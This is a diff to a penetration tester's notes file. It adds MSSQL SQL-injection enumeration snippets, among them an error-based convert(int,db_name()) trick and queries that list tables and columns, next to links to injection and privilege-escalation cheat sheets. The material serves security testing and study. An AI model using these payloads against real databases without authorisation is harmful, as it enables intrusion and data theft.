@@ -18,6 +18,15 @@ https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
 [sql injection cheat sheet]
 https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
 
+[sql injection: mssql]
+>> find available databases
+convert(int,db_name(5))
+db_name(db_id)
+>> Find number of tables
+use TEST;select top 1 table_name from INFORMATION_SCHEMA.tables
+>> find number of columns
+use Project;select column_name from information_schema.columns order by (select null) OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY
+
 [sql injection: Oracle]
 >> find number of columns
 // ps: the datatype must be the same
